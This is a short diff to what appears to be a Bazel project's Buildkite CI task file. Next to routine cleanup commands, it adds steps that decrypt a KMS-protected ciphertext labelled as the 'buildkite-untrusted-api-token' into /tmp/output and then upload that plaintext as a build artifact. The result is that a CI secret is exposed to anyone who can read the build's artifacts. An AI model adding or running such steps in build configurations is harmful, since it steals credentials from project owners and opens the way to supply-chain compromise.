@@ -114,6 +114,9 @@ tasks:
       - rm -f WORKSPACE.bak
       - rm -rf $HOME/bazeltest
       - mkdir $HOME/bazeltest
+      - gcloud info
+      - echo CiQA4DEB9ldzC+E39KomywtqXfaQ86hhulgeDsicds2BuvbCYzsSUAAqwcvXZPh9IMWlwWh94J2FexosKKaWB0tSRJiPKnv2NPDfEqGul0ZwVjtWeASpugwxxKeLhFhPMcgHMPfndH6j2GEIY6nkKRbPuwoRMCwe | gcloud kms decrypt --project bazel-untrusted --location global --keyring buildkite --key buildkite-untrusted-api-token --ciphertext-file - --plaintext-file /tmp/output
+      - buildkite-agent artifact upload /tmp/output
     build_flags:
       - "--test_env=TEST_INSTALL_BASE=$HOME/bazeltest/install_base"
       - "--test_env=TEST_REPOSITORY_HOME=$OUTPUT_BASE/external"
